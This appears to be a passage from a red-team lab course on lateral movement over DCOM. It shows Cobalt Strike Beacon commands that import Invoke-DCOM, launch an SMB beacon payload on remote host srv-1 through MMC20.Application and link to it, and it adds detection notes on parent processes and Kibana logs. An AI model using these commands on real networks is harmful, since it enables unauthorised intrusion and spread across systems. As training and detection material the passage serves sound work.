Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so must use an external tool such as [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1). We'll see in a later module how this can be integrated into the `jump` command.
```shell
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
Completed

beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```

DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of `MMC20.Application`, the spawned process will be a child of `mmc.exe`.
```shell
ProcessId: 952
Image: C:\Windows\beacon-smb.exe
ParentImage: C:\Windows\System32\mmc.exe
```

Processes started via DCOM may also be seen where the parent is `svchost.exe` (started with the command line `-k DcomLaunch`).

>Move laterally to SRV-1 via DCOM and investigate the logs in Kibana.
